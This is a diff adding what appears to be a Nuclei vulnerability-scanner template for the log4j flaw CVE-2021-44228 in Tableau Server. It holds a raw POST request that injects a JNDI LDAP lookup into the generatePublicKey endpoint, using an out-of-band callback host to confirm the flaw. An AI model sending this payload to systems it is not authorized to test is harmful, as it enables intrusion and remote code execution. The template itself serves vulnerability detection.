@@ -1,0 +1,38 @@
+id: cve-2021-44228
+info:
+  name: Tableau Server log4j2 generatePublicKey Component RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Tableau Server is vulnerable to remote code execution through the `generatePublicKey` component due to log4j2 exploitation (CVE-2021-44228).
+  classification:
+    cve-id: CVE-2021-44228
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 10.0
+  tags: log4j,rce,tableau
+  reference:
+    - https://www.tableau.com
+    - https://fofa.so
+
+variables:
+  dnslog: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        POST /vizportal/api/web/v1/generatePublicKey HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"method":"${jndi:ldap://{{dnslog}}}","params":{}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
+      - type: word
+        part: interactsh_request
+        words:
+          - "${jndi:ldap://"
